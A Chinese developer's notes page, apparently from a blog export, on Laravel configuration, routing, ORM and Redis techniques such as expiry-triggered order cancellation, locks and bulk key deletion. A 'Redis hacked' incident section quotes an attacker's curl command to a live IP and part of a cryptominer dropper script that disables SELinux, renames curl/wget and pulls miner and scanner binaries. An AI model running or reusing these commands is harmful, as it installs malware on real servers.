文件修改 connections 下面的 beanstalkd 数组中 host 的值为 env('QUEUE_HOST', 'localhost')，意思就是默认使用 .env 文件中定义的 QUEUE_HOST 值'connections' =&gt; [ . . . 'beanstalkd' =&gt; [ 'driver' =&gt; 'beanstalkd', 'host' =&gt; env('QUEUE_HOST', 'localhost'), 'queue' =&gt; 'default', 'retry_after' =&gt; 90, 'block_for' =&gt; 0, ], . . .],使用 beanstalkd_console 从 Web 界面管理您的队列运行 Beanstalkd 控制台容器docker-compose up -d beanstalkd-console访问 http://localhost:2080/ https://learnku.com/articles/32366 注册了多少条路由12$ php artisan route:list | wc -l | awk '&#123;print $1 - 4&#125;'获取到上面的统计到的行数再减去 4（因为 list 中包含了 3 行制表符 和 1 行表头），最终得到了你的路由数量 Laravel ORM SQL 语句查询123456789101112131415161718192021在 app/Providers/AppServiceProvider 中的 boot 方法中新增以下代码：\Illuminate\Database\Query\Builder::macro('sql', function () &#123; $bindings = $this-&gt;getBindings(); $sql = str_replace('?','%s',$this-&gt;toSql()); return vsprintf($sql, $bindings);&#125;);\Illuminate\Database\Eloquent\Builder::macro('sql', function()&#123; return ($this-&gt;getQuery()-&gt;sql());&#125;);二、使用方式查询带参数的 SQL 语句可在 ORM 后调用方法// 正确用法User::query()-&gt;where('id', 1)-&gt;sql();// 错误用法User::query()-&gt;where('id', 1)-&gt;get()-&gt;sql();User::query()-&gt;where('id', 1)-&gt;first()-&gt;sql();https://learnku.com/articles/33484 cache12345678910111213141516171819202122232425262728293031323334use Illuminate\Support\Facades\Cache;Cache::get('xxx');app('Illuminate\Contracts\Cache\Factory')-&gt;get('xxx');app('Illuminate\Cache\CacheManager')-&gt;get('xxx');app('cache')-&gt;get('xxx');app()['cache']-&gt;get('xxx');cache('xxx'); function cache() &#123; $arguments = func_get_args(); if (empty($arguments)) &#123; return app('cache'); &#125; if (is_string($arguments[0])) &#123; return app('cache')-&gt;get(...$arguments); &#125; if (! is_array($arguments[0])) &#123; throw new Exception( 'When setting a value in the cache, you must pass an array of key / value pairs.' ); &#125; if (! isset($arguments[1])) &#123; throw new Exception( 'You must specify an expiration time when setting a value in the cache.' ); &#125; return app('cache')-&gt;put(key($arguments[0]), reset($arguments[0]), $arguments[1]); https://learnku.com/articles/33628 Laravel 的请求是怎么到达控制器12 分类列表无限分类12345678910111213141516171819202122public static function getTree($data,$pId,$level = 0)&#123; static $list = []; foreach ($data as $key =&gt; $value)&#123; //第一次遍历,找到父节点为根节点的节点 也就是pid=0的节点 if ($value['parent_id'] == $pId)&#123; //父节点为根节点的节点,级别为0，也就是第一级 $value['level'] = $level; $value['display_name'] =$value['displayname']; $value['displayname'] = str_repeat('━━', $value['level']).$value['displayname']; //把数组放到list中 $list[] = $value; //把这个节点从数组中移除,减少后续递归消耗 unset($data[$key]); //开始递归,查找父ID为该节点ID的节点,级别则为原级别+1 self::getTree($data, $value['id'], $level+1); &#125; &#125; return $list; &#125;优雅的树形数据结构管理包,基于Closure Table模式设计. https://github.com/jiaxincui/closure-table 获取路由123456789101112131415161718192021222324252627282930$routeCollection = \Route::getRoutes();foreach ($routeCollection as $value) &#123; $routes[] = [$value-&gt;getPath(),$value-&gt;methods()[0], $value-&gt;getActionName()];&#125;Route::get('routes', function() &#123; $routeCollection = Route::getRoutes(); echo "&lt;table style='width:100%'&gt;"; echo "&lt;tr&gt;"; echo "&lt;td width='10%'&gt;&lt;h4&gt;HTTP Method&lt;/h4&gt;&lt;/td&gt;"; echo "&lt;td width='10%'&gt;&lt;h4&gt;Route&lt;/h4&gt;&lt;/td&gt;"; echo "&lt;td width='10%'&gt;&lt;h4&gt;Name&lt;/h4&gt;&lt;/td&gt;"; echo "&lt;td width='70%'&gt;&lt;h4&gt;Corresponding Action&lt;/h4&gt;&lt;/td&gt;"; echo "&lt;/tr&gt;"; foreach ($routeCollection as $value) &#123; echo "&lt;tr&gt;";//sina/vendor/laravel/framework/src/Illuminate/Routing/Route.php:919 echo "&lt;td&gt;" . $value-&gt;getMethods()[0] . "&lt;/td&gt;"; echo "&lt;td&gt;" . $value-&gt;getPath() . "&lt;/td&gt;"; echo "&lt;td&gt;" . $value-&gt;getName() . "&lt;/td&gt;"; echo "&lt;td&gt;" . $value-&gt;getActionName() . "&lt;/td&gt;"; echo "&lt;/tr&gt;"; &#125; echo "&lt;/table&gt;";&#125;);https://stackoverflow.com/questions/18394891/how-to-get-a-list-of-registered-route-paths-in-laravelhttps://stackoverflow.com/questions/15955295/displaying-registered-routes-in-laravelphp artisan route:list sina/vendor/laravel/framework/src/Illuminate/Foundation/Console/RouteListCommand.php:14 自动将空字符串转为 null123456laravel 有一个 ConvertEmptyStringsToNull 中间件，自动将空字符串转为 null。在 App\Http\Kernel.php 中，注释了这个中间件就好了。 QueryException In Connection.php line 664 : SQLSTATE[23000]: Integrity constraint violation: 1048 Column 'judge_group' cannot be null 打印下 Request 返回的数据，Laravel 有个中间件会把 ' ' 转为 null。https://learnku.com/laravel/t/35052 Laravel 5.5 升级到 6.0123456使用 phpredis 替代 predisLaravel 开始推荐使用 phpredis 来代替 predis。所以要记得先安装 phpredis, 然后在 config/app.php 中去掉 Redis 别名https://learnku.com/articles/35056 API 和 后台接口分离12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455发现路由数量变多后影响到了性能，这个时候需要区别不同服务器去加载不同的路由。如何去别不同的服务器区别环境，但是又要区别是生产环境。可以使用 app()-&gt;environment(); 方法实现，生产环境和测试环境的区别。查看代码后发现可以使用更多的方法。/** * 获取或检查当前应用程序环境。 * * @return string|bool */public function environment()&#123; // 返回传递给函数的参数数量 if (func_num_args() &gt; 0) &#123; // 如果第一个参数是数组就去第一个，不是的话取全部的。 $patterns = is_array(func_get_arg(0)) ? func_get_arg(0) : func_get_args(); return Str::is($patterns, $this['env']); &#125; return $this['env'];&#125;Str::is 函数判断给定的字符串是否匹配给定的模式。星号 * 可以用来表示通配符：# 判断在 API 环境app()-&gt;environment("production.api");# 判断在 ADMIN 环境app()-&gt;environment("production.admin");# 判断在所有环境app()-&gt;environment("production.*");修改 RouteServiceProvider 文件/** * Define the routes for the application. */public function map()&#123; // 公共路由 if (app()-&gt;environment('production.api')) &#123; # production api 路由 $this-&gt;mapApiRoutes(); &#125; elseif (app()-&gt;environment('production.admin')) &#123; # production admin 路由 $this-&gt;mapAdminRoutes(); &#125; else &#123; # local testing stanging 环境下加载所有路由 $this-&gt;mapApiRoutes(); $this-&gt;mapAdminRoutes(); &#125;&#125;https://learnku.com/articles/35099 laravel路由分割12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364Route::group(['middleware' =&gt; ['web']], function () &#123; Route::group(['prefix' =&gt; 'user', 'namespace' =&gt; 'User'], function () &#123; require app_path('Http/Routes/user.php'); &#125;); Route::group(['prefix' =&gt; 'admin', 'namespace' =&gt; 'Admin'], function () &#123; require app_path('Http/Routes/admin.php'); &#125;); Route::group(['prefix' =&gt; 'api', 'namespace' =&gt; 'Home'], function () &#123; require app_path('Http/Routes/homeapi.php'); &#125;);&#125;);app/Providers/RouteServiceProvider.php 的 map 方法中可以如下定义：public function map(Router $router)&#123; $router-&gt;group(['namespace' =&gt; $this-&gt;namespace], function ($router) &#123; //require app_path('Http/routes.php'); foreach (glob(app_path('Http//Routes') . '/*.php') as $file) &#123; $this-&gt;app-&gt;make('App\\Http\\Routes\\' . basename($file, '.php'))-&gt;map($router); &#125; &#125;);&#125;https://learnku.com/laravel/t/2484/the-best-way-to-split-routesphp-laravel-routing-filephp artisan route:cache public function map() &#123; $this-&gt;mapWebRoutes(); $this-&gt;mapApiRoutes(); // &#125; protected function mapWebRoutes() &#123; Route::group([ 'middleware' =&gt; 'web', 'namespace' =&gt; $this-&gt;namespace, ], function ($router) &#123; require base_path('routes/web.php'); &#125;); &#125; protected function mapApiRoutes() &#123; Route::group([ 'middleware' =&gt; ['api', 'auth:api'], 'namespace' =&gt; $this-&gt;namespace, 'prefix' =&gt; 'api', ], function ($router) &#123; require base_path('routes/api.php'); &#125;); &#125;http://www.xiaot123.com/post/laravel_route按照URLif (Str::is('api.*', request()-&gt;server('HTTP_HOST') ?? '')) &#123; $this-&gt;mapApiRoutes();&#125; elseif (Str::is('admin.*', request()-&gt;server('HTTP_HOST') ?? '')) &#123; $this-&gt;mapAdminRoutes();&#125; else &#123; $this-&gt;mapApiRoutes(); $this-&gt;mapAdminRoutes();&#125; Laravel 项目的简单 CMS Laravel 之道 Laravel 代码生成器 https://learnku.com/laravel/t/34772 https://github.com/GooGee/Entity-Builder 使用 Docker LNMP 部署 PHP 开发环境 PHP-fpm MongoDB 连接数 Laravel 源码写的一个简易框架 轻松部署 Laravel 应用 接近免费的 SSL 证书 https://www.digital-sign.com.cn/register 一键生成 https 根域名证书更方便，推荐 certbot-auto 脚本 Laravel 的开源api文档管理系统 Wizard CentOS7 轻松部署 Laravel 应用 超大文件上传 使用 AetherUpload 视频上传过程 axeadmin 让你的 Laravel 快速拥有一个后台 Laravel 的请求是怎么到达控制器 控制台实时查看 sql HTTP 协议免费升级到 HTTPS Laravel-echo-server 开发聊天室和客服功能 laravel之道 Laravel 代码生成工具 Laravel 源码阅读 - Eloquent laravel最佳实践 Laravel+vue 个人博客 Laravel 从学徒到工匠精校版 服务容器 Laravel5.8 版本内核源码注解 Laravel-admin 源码分析系列 Laravel 源码阅读 Laravel 数据库脱敏工具 Laravel 深入浅出指南 Laravel5.5LTS 版本源码内核阅读注解 laravel 源码详解https://github.com/LeoYang90/laravel-source-analysis Laravel + Vue + Oss 搭建的图片墙 基于 Laravel + Ant-design-pro 界面美观漂亮的后台 Laravel-admin 安装分析 电子商务后台系统 基于laravel的博客 laravel5.8版本源码分析 基于 adminLTE3、Laravel、swoole 的微服务管理平台 Laravel-snappy 生成 PDF 踩坑记录 docker/laradock 安装 Laravel 融合 Markdown Laravel框架关键技术解析 Laravel Markdown Blog laravel markdown api文档 markdown 来撰写文档 Laravel 融合 Elasticsearch/Algolia Laravel Artisan 命令大全 Laravel 底层分析系列文章：生命周期 大话后端开发高高并发的奇技淫巧 PHP 跨域的 CORS 中间件 Laravel 谷歌翻译 Laravel 搭建 Composer 包 Laravel 和 layui 包含基础 RBAC 权限的管理后台 生命周期和容器 Container Supercharged Excel exports and imports in Laravel MySQL 避坑宝典 文章收藏的扩展包 多语言与多时区的解决方案 laravel框架源码分析注解 Laravel 团队任务管理系统 基于 Laravel + Ant-design 界面美观漂亮的后台 Laravel 本地语言包自动翻译插件 Laravel+Layim+GatewayWorker workerman 实现实时聊天功能 「Laravel 文档助手」 - 油猴脚本 Laravel 短信扩展包 Laravel 中的事件监听 基于Laravel构建请求信息日志以及接口智能分析 Laravel 5.8 速查表 Laravel 关联模型扩展 Laravel 的第三方平台登录 Laravel- 访问设备识别组件-BrowserDetect Laravel 道场 Laravel5.5 支付宝支付 Laravel 广播 Laravel 5.5 升级到 5.7 小记 生成chm文档 深入研究 Laravel 源码第二天 依赖注入扩展包 PHP 权限管理框架 Casbin laravel 代码生成器 2.0 轻松部署 Laravel 应用 深入了解 Laravel 的工作机制 Laravel 中 IoC 容器 laravel之道系列 Laravel核心代码学习 laravel服务容器 Laravel 的生命周期比喻的更形象一点 paypal PHP-sdk 支付 / 回调 / 退款全流程 Laravel 5.5 和 React 的个人博客系统 Laravel 从零单排系列教程 基于 Tire 树的敏感词检测 QQ 第三方登录 PHP 有限状态机 laravel vue博客 Voyager 的使用及二次开发 Composer 自动加载源码 GitLab CI 踩坑 小白折腾服务器（一）：docker 搭建 lnmp+ 使用 deployer 部署 不使用框架的情况下也能写出现代化 PHP 代码 基于 Laravel 的 CMS Laravel LDAP 包 PhpSpreadsheet 简单 Excel 导入导出 valet 切换 PHP 版本 Laravel Money 金钱单位格式化 Laravel 中自定义用户登录的数据表users 浅析依赖倒转、控制反转、IoC 容器、依赖注入 用语言 (非代码) 说清楚 IoC 到底是什么 PHP中的依赖注入（DI）容器 十五个常用的 Laravel 集合 Laravel 服务容器，IoC,DI Laravel 服务容器、服务提供器、契约实例讲解 Laravel 服务容器，IoC,DI 《提问的智慧》小测验 Laravel 使用 Elasticsearch 全局搜索 PHP实现的一些算法例子 计算机网络读书笔记 正则preg_match匹配长度 优酷 YouKu OAuth2 第三方登录库 开源学校管理系统 超全的设计模式简介 如何应对服务器压力 数据库中用一个值来保存多种情况：二进制和按位异或 在阿里云上搭建自己的git服务器 RabbitMQ 的应用场景以及基本原理介绍 编译安装nginx1.9.7+php7.0.0 Laravel 开发 API 更得心应手 别再使用 JWT 作为 Session 系统 同一公司下多产品的用户权限管理系统设计 数据结构和算法 PHP中关于时间（戳）、时区 大文件上传扩展 Laravel 微信小程序后端搭建 Algolia DocSearch 轻松实现文档全站搜索 SOLID 设计原则 MySQL分组查询TOP N的实践和踩坑 不要在循环体中使用 array_merge () 查询物流信息的扩展包 PHPStrom 转 VSCode 折腾记录 【看完就懂】Laravel 服务容器，IoC,DI 整理 PC 端微信扫码支付全过程 — easywechat + Laravel 5.8 Laravel Excel 的五个隐藏功能 woann-chat 基于 laravelS 和 layim 的聊天系统 Laravel-Excel 3.0 文档 Laravel 进阶教程 Laravel Redis 广播 实例 基于 The 996 Prohibited License 的项目Laravel-admin-select2 处理 API 数据格式 Laravel 项目全自动接口管理 Auth 2.0 的一种简单解释 Laravel 从零单排系列教程 Laravel 5.7 和 JSON Web 令牌（tymon/jwt-auth） - 用户认证 生产环境的 Composer 输出 SQL 语句 Laravel Passport 为你的 REST API 增加用户认证功能 不要在循环体中使用 array_merge () Laravel API throttle 限流原理分析 Laravel 登录原理剖析 Laravel 安装和开发环境 Cookie 禁用了，Session 还能用吗 设计模式 PHP 详细面试总结 php设计模式 https://baijunyao.com/ 《PHP 设计模式全集 2018》 Laravel Markdown Blog 设计模式超级简单的解释 Laravel Markdown Blog learnku.net PHP 开发环境安装配置Laradock 头像自动生成 Laravel-admin 集成 Markdown 编辑器 swoole 邮件系统 Laravel 测试之 —— PHPUnit 入门教程 composer 解析 Laravel 5.7 撸了一个论坛 Laravel 文档助手」 - 油猴脚本 全新搭建 PHP 开发环境 编写具有描述性的 RESTful API Laravel-China 课程文章同步发布 代理与反向代理、负载均衡和缓存 Laravel5.5 使用 Elasticsearch 做引擎 Laravel Eloquent 小技巧 Laravel Cron 定时任务 “跳坑” 点 Laravel + Laravel-echo + EasyWeChat 实现微信扫码登录 你可能不太需要 Laravel-Excel Oss Flysystem 扩展 Laravel5.6 整合 RabbitMQ 消息队列 Laravel 集合（Collection）的基础用法 『 OAuth2.0』 猴子都能懂的图解 Laravel 的消息通知系统 Laravel 项目中使用 Elasticsearch 做引擎 简聊 Session 与 Token 身份验证 六个值得参考的 Laravel 开源项目 Laravel 启动流程分析 Lumen/Laravel 集成 GatewayWorker (Workerman)，实现简单的聊天系统. Laravel踩坑日记之基本配置及Demo 腾讯云智 AI 图像服务的 Laravel SDK 基于Laravel支持markdown的博客Vien Blog Laravel 团队任务管理系统 「Laravel 文档助手」 - 油猴脚本 队列原理分析 Laravel + H-ui 搭建后台管理系统 laravel手册 基于 larecipe 做的 Laravel 速查表 Laravel 中连接 Webscoket 自动生成 CURD laravel5.5和vue.js结合的前后端分离项目模板websocket聊天室]]></content>
      <tags>
        <tag>laravel</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[redis 记录]]></title>
    <url>%2F2019%2F03%2F26%2Fredis-%E8%AE%B0%E5%BD%95%2F</url>
    <content type="text"><![CDATA[指定时间自动取消订单1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192939495969798991001011021031041051061071081091101111121131141151161171181191201211221231241251261271281291301311321331341351361371381391401411421431441451461471481491501511521531) 使用Linux内置的crontab定时任务，每隔几秒甚至几分钟轮训遍历一次数据库，找到超出时间间隔的订单，进行取消。这种办法没有失效性以及在没有订单的时间内属于浪费服务器资源。2) 使用框架内置的延时处理机制。比如Laravel的队列任务，可以指定多少分钟后执行。这样就能判断订单是否超出时间间隔，是否要取消订单恢复库存量。3) 使用Redis的keyspace notification（键空间通知）。Redis可以设置一个key到多久时间后过期,比如:SETEX name 123 20,设置name在20秒后过期。此时，过期会触发事件发布，所有redis客户端都会订阅，获得相关信息。//https://www.guaosi.com/2019/02/25/automatically-cancel-the-order/vim usr/local/etc/redis/redis.confnotify-keyspace-events "Ex"service redis-server restart /usr/local/etc/redis/redis.conf会监听0号库所有过期的keyredis-clipsubscribe __keyevent@0__:expired 监听0号库所有过期的keysetex name 5 guaosi5秒后，原终端会输出如下1) "pmessage"2) "__keyevent@0__:expired"3) "__keyevent@0__:expired"4) "name"class MRedis&#123; private $redis; /** * 构造函数 * * @param string $host 主机号 * @param int $port 端口号 */ public function __construct($host = 'redis', $port = 6379) &#123; $this-&gt;redis = new redis(); $this-&gt;redis-&gt;connect($host, $port); &#125; public function expire($key = null, $time = 0) &#123; return $this-&gt;redis-&gt;expire($key, $time); &#125; public function psubscribe($patterns = array(), $callback) &#123; $this-&gt;redis-&gt;psubscribe($patterns, $callback); &#125; public function setOption() &#123; $this-&gt;redis-&gt;setOption(Redis::OPT_READ_TIMEOUT, -1); &#125;&#125;//变量$msg就是过期的key的名称，我们只能获取到key的名称，不能获得到原来设置的值。function callback($redis, $pattern, $chan, $msg)&#123; // 回调函数,这里写处理逻辑 echo "Pattern: $pattern\n"; echo "Channel: $chan\n"; echo "Payload: $msg\n";&#125;$redis = new MRedis();//redis会有默认连接时间，对 redis客户端进行一些参数设置，使读取超时参数 为 -1，表示不超时。$redis-&gt;setOption();//这里输入订阅，以及订阅成功后触发的函数名//监听库为0里的过期key$redis-&gt;psubscribe(array('__keyevent@0__:expired'), 'callback');php test.phplarvel config/database.php'redis' =&gt; [ 'client' =&gt; 'predis', 'default' =&gt; [ 'host' =&gt; env('REDIS_HOST', '127.0.0.1'), 'password' =&gt; env('REDIS_PASSWORD', null), 'port' =&gt; env('REDIS_PORT', 6379), 'database' =&gt; env('REDIS_DATABASE', 0), 'persistent' =&gt; true, // 开启持久连接 'read_write_timeout' =&gt; 0, //据Predis作者在配置文件中说明 //因为在底层网络资源上执行读取或写入操作时使用了超时，默认设置了timeout 为60s。 //到60s自动断开并报错.设置成0可以解决这个问题。 ], ],class OrderController extends Controller&#123; //创建用户订单 public function store(Request $request) &#123; //这里是接收到用户传来的下单信息，存入数据库后，返回一个订单id //我们让返回的订单ID为2019 $order_id = 2019; //因为一个项目中可能会有很多使用到setex的地方，所以给订单id加个前缀 $order_prefix_id = 'order_'.$order_id; //将订单ID存入redis缓存中，并且设置过期时间为5秒 $key_name = $order_prefix_id; //我们在订阅中只能接收到$key_name的值 $expire_second = 5; //设置过期时间，单位为秒 $value = $order_id; Redis::setex($key_name,$expire_second,$value); echo "设置过期key=".$order_prefix_id."成功"; &#125;&#125;public function handle() &#123; //项目中有可能用的redis不是0，所以这里用env配置里面获取的 $publish_num=env('REDIS_DATABASE', 0); Redis::psubscribe(['__keyevent@'.$publish_num.'__:expired'], function ($message, $channel) &#123; //$message 就是我们从获取到的过期key的名称 $explode_arr=explode('_',$message); $prefix=$explode_arr[0]; if($prefix=='order')&#123; $order_id=$explode_arr[1]; echo $order_id; //这里就是编写过期的订单，过期后要如何处理的业务逻辑 //TODO &#125; &#125;); &#125; 监听处理程序只要一台处理，把监听处理的过程改一下，取出订单 ID 之后不要去处理，通过 rpush 放到一个 redis 的队列里去。另外起几台服务器，连到这个 redis 服务器，通过 blpop 接收消息队列里出来的订单 ID。这样，多台机器可以同时工作，一个订单只会从 blpop 里出来一次，不会重复执行，多台机器可以分担任务，又互不影响。消息队列也可以换成业界成熟的 rabbitmq 、 kafka 之类的专业消息队列，那又是另外一个话题了。反正业务量大了，变复杂了，消息总线跑不掉，天猫京东也差不多如此https://learnku.com/articles/21488 使用 zset 比利用 redis 的大 key set 这样的形式，节约一些空间占用，定时任务处理方面，可以使用 swoole 的 swoole_timer_tick 全都是内存级的操作，会提升很多效率。https://alpha2016.github.io/2019/02/24/%E5%80%9F%E5%8A%A9Swoole%E5%AE%9A%E6%97%B6%E8%BF%87%E6%9C%9F%E6%9C%AA%E6%94%AF%E4%BB%98%E8%AE%A2%E5%8D%95/ 借助 redis 的 zset 有序集合，订单产生的时候，zadd orders timestamp orderid 将 orderid 保存到对应的 orders 集合中，以时间戳作为他的 score 分值，存储部分是这样的，简单 + 占用空间内存极小。读取部分： 在 swoole 启动时，设置定时器，每分钟去 orders set 中读取设置的时间之前的数据，个人为了测试方便，设置的读取前一分钟到前三十分钟内的数据。获取到数据之后，根据业务逻辑处理数据，然后 zrem orders orderid 命令从集合中移除对应的 orderid。个人以为这个方案是内存占用和效率兼具的一个方案 &lt;?php $server = new swoole_websocket_server("0.0.0.0", 9502); // 在定时器中使用协程需要增加此项配置 $server-&gt;set( [ 'enable_coroutine' =&gt; true ] ); $server-&gt;on('workerStart', function ($server, $workerId) &#123; $redis = new Swoole\Coroutine\Redis(); $redis-&gt;connect('127.0.0.1', 6379); // tick 为持续触发的定时器 swoole_timer_tick(10000, function() use ($redis) &#123; $upperLimitTime = strtotime('-1 minute'); $lowerLimitTime = strtotime('-30 minute'); echo '上限时间:' . $upperLimitTime . '下限时间:' . $lowerLimitTime; $result = $redis-&gt;zrangebyscore('orders', $lowerLimitTime, $upperLimitTime); var_dump($result); // 根据查询到的 id 进行业务处理，然后 zrem orders orderid 移除处理成功的 orderid &#125;); &#125;); $server-&gt;on('message', function (swoole_websocket_server $server, $request) &#123; $server-&gt;push($request-&gt;fd, "hello"); &#125;); $server-&gt;start(); 数据类型不一致123两处使用了一个 zSets，一处是从网页获取数据，放到 zSets 里面；另一处是从数据库获取数据放到 zSets 里面。在后期做清除数据操作的时候，发现了数据清除的不完全，后来仔细的检查了一下。发现数据重复。https://www.h57.pw/2016/09/20/redis-zsets-data-type-inconsistency/仔细测试了好一会儿之后，才发现了问题坐在，就是当 score 相同的时候，相同的 value 会覆盖数据，这里的 value 相同，并不仅仅是值相同，而且数据类型也应该一致才会覆盖。否则就会产生 score 相同的两条数据。 Redis 被黑123456789101112131415161718192021222324252627282930313233343536https://learnku.com/laravel/t/28411MISCONF Redis is configured to save RDB snapshots, but it is currently not able to persist on disk. Commands that may modify the data set are disabled, because this instance is configured to report errors during writes if RDB snapshotting fails (stop-writes-on-bgsave-error option). Please check the Redis logs for details about the RDB error.之后通过 127.0.0.1:6379&gt; config set stop-writes-on-bgsave-error no 命令解决了问题执行 curl -fsSL http://198.13.42.229:8667/6HqJB0SPQqbFbHJD/init.sh 等命令得了一些脚本#!/bin/shsetenforce 0 2&gt;dev/nullecho SELINUX=disabled &gt; /etc/sysconfig/selinux 2&gt;/dev/nullsync &amp;&amp; echo 3 &gt;/proc/sys/vm/drop_cachescrondir='/var/spool/cron/'"$USER"cont=`cat $&#123;crondir&#125;`ssht=`cat /root/.ssh/authorized_keys`echo 1 &gt; /etc/sysupdatesrtdir="/etc/sysupdates"bbdir="/usr/bin/curl"bbdira="/usr/bin/cur"ccdir="/usr/bin/wget"ccdira="/usr/bin/wge"mv /usr/bin/wget /usr/bin/getmv /usr/bin/xget /usr/bin/getmv /usr/bin/get /usr/bin/wgemv /usr/bin/curl /usr/bin/urlmv /usr/bin/xurl /usr/bin/urlmv /usr/bin/url /usr/bin/curminer_url="https://pixeldrain.com/api/download/Y0o4foA1"miner_url_backup="http://198.13.42.229:8667/6HqJB0SPQqbFbHJD/sysupdate"miner_size="854364"sh_url="http://198.13.42.229:8667/6HqJB0SPQqbFbHJD/update.sh"sh_url_backup="http://198.13.42.229:8667/6HqJB0SPQqbFbHJD/update.sh"config_url="http://198.13.42.229:8667/6HqJB0SPQqbFbHJD/config.json"config_url_backup="http://198.13.42.229:8667/6HqJB0SPQqbFbHJD/config.json"config_size="3300"scan_url="https://pixeldrain.com/api/download/OMKMU5Td"scan_url_backup="http://198.13.42.229:8667/6HqJB0SPQqbFbHJD/networkservice"scan_size="2584064"https://www.freebuf.com/vuls/148758.html 查看线上环境是否使用了 redis-weui 了 加锁和解锁问题123456789101112131415161718192021222324252627282930if ($redis-&gt;set('my:lock', 1, ['NX'])) &#123; # todo $redis-&gt;del('my:lock'); &#125;其中NX — 表示只有key不存在的时候才设置https://shuwoom.com/?p=2833if ($redis-&gt;set('my:lock', 1, ['NX', 'EX' =&gt; 10])) &#123; # todo $redis-&gt;del('my:lock'); &#125; 原子性问题而面临上面同样的问题。所以这里要用到lua脚本来解决。 $script = ' if redis.call("get",KEYS[1]) == ARGV[1] then return redis.call("del",KEYS[1]) else return 0 end '; $token = uniqid(mt_rand(), true); if ($redis-&gt;set('my:lock', $token, ['NX', 'EX' =&gt; 10])) &#123; # todo $redis-&gt;eval($script, ["my:lock", $token], 1); &#125; else &#123; echo 'get lock failed!'; &#125; php redis123456789101112131415161718192021try &#123; $redis = new Redis(); $redis-&gt;connect('127.0.0.1', 6379, 1); # 短连接，超过1秒放弃连接https://shuwoom.com/?p=2786// $redis-&gt;open('127.0.0.1', 6379, 1); # 同上// $redis-&gt;pconnect('127.0.0.1', 6379, 1); # 长连接，超过1秒放弃连接 $redis-&gt;popen('127.0.0.1', 6379, 1); # 同上 # 登录验证密码，返回：true或false if ($redis-&gt;auth('password')) &#123; echo 'auth success!'; &#125; else &#123; echo 'auth failed!'; throw new Exception('Redis auth failed!'); &#125; $redis-&gt;select(0); # 选择redis库，0~15，共16个库 $redis-&gt;close(); # 释放资源// $redis-&gt;ping(); # 检查是否还在连接&#125; catch (Exception $e) &#123; var_dump($e-&gt;getMessage());&#125; 常用命令123456789101112131415161718192021222324252627282930ping ping我们的主机能否链接 链接是否存活echo 命令 echo demo直接输出select 选择数据库 select 0-16个数据库quit exit 退出链接dbsize 返回数据库的键的个数info 返回服务器相关信息config get 返回服务配置信息flush db 清空数据库flushall 删除所有数据库中所有的键Key-valueskeys * 匹配键所有的键. 模糊匹配 keys my* 取出所有已my开头的键exists 判断是否键 exists name判断是否有name这个键是否存在del 删除键 del name 删除name的键expire 设置过期时间 expire key timettl key 查看键的过期时间select database 选择数据库move key dababase1 讲key移动dao database1中的数据库中persist 取消键的过期时间randomkey 随机返回一个键的值rename 重命名一个键type key 判断key的数据类型批量删除 0号数据库中名称含有OMP_OFFLINE的key：src/redis-cli -n 0 keys "*OMP_OFFLINE*"|xargs src/redis-cli -n 0 del在redis的客户端环境中并不支持批量删除。可以把某个keys的结果全部输出到文件中，比如keys.logredis-cli -p port -c command &gt; keys.loghttps://anttutu.github.io/2017/06/redis/ 批量删除redis的key123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899redis-cli -h host -p 6379 -a pwd -n 15 --scan --pattern 'exchange*' | xargs -0 -n 5000 redis-cli -h host -a pwd -p 6379 -n 15 DEL-h 你的redis服务器地址-p 端口 默认6379-a 密码-n 选择redis对应的dbxargs参数:-n 按每n个为一组输出参数，如果redis的Key数量大的话可以增加此参数,否则会报错 argument list too long-0 当key还有引号等特殊字符,加此参数可以屏蔽,使特殊字符失效,不加会报错:https://segmentfault.com/a/1190000016717860每次扫10条 redis-cli --scan --pattern 'app:uid:reg:date:707*'|xargs -n 10 redis-cli mget登录redis通过info查看，内存使用25G多，而KEY也有1.44亿了。。。REIDS中有大量无用而又未设置过期时间的KEY存在。设置个过期时间，举手之劳的事，还是有必要的。used_memory_human:24.72Gdb0:keys=144856453,expires=25357通过测试机执行 keys prefix* 导致REDIS卡死，其他连接也连不上。所以定位到问题出现在keys命令上，也正如手册上说的造成性能问题。如何删除未用到的KEY？大部分KEY是有规律的，有特定前缀，需要拿到特定前缀的KEY然后删除，网上有这样的命令：redis-cli -a redis-pwd -n 0 keys "preffix*" | xargs redis-cli -p 6379 -a redis-pwd -n 0 del测试机执行keys “preffix-1*“时间大概40多s，这意味着redis要停40s+，而前缀是按天设置的，这样子需要操作多次，因为业务的原因，不允许这么操作，分分钟都是钱~最后想到的办法是先从测试机上把满足条件的key导到文本，前面的语句通过cat文本去拿。如：redis-cli -p 6380 -a redis-pwd keys "preffix-1*" &gt; /home/keys_redis/preffix-1然后通过这些数据删掉生产环境上的key。cat /home/keys_redis/preffix-1 | xargs redis-cli -a redis-pwd -n 0 del删除的速度非常快，内存耗的也挺快，感觉像是有多少耗多少的。执行之后KEY的数量减少了95%+，内存也从25G降到了2G。不过有一个指数升高：mem_fragmentation_ratio，前后的memory对比：# Memory 处理前used_memory:26839186032used_memory_human:25.00Gused_memory_rss:23518339072used_memory_peak:26963439000used_memory_peak_human:25.11Gused_memory_lua:31744mem_fragmentation_ratio:0.88mem_allocator:jemalloc-3.2.0# Memory 处理后used_memory:2399386704used_memory_human:2.23Gused_memory_rss:4621533184used_memory_peak:26963439000used_memory_peak_human:25.11Gused_memory_lua:31744mem_fragmentation_ratio:1.93mem_allocator:jemalloc-3.2.0https://itopic.org/redis-delete-keys.html&lt;?php$redis = new Redis();//设置扩展在一次scan没有查找出记录时 进行重复的scan 直到查询出结果或者遍历结束为止$redis-&gt;setOption(Redis::OPT_SCAN, Redis::SCAN_RETRY);$match = 'foo:*';$count = 10000;$it=null; //这种用法下我们只需要简单判断返回结果是否为空即可, 如果为空说明遍历结束while ($keys = $redis-&gt;scan($it, $match, $count)) &#123; $redis-&gt;del($keys);&#125;?&gt;在删除的同时注意监控内存变化情况，就能确认问题了：shell&gt; watch -d -n 1 '/path/to/redis-cli info | grep memory'/* 设置遍历的特性为不重复查找，该情况下扩展只会scan一次，所以可能会返回空集合 */$redis-&gt;setOption(Redis::OPT_SCAN, Redis::SCAN_NORETRY); $it = NULL;$pattern = '*';$count = 50; // 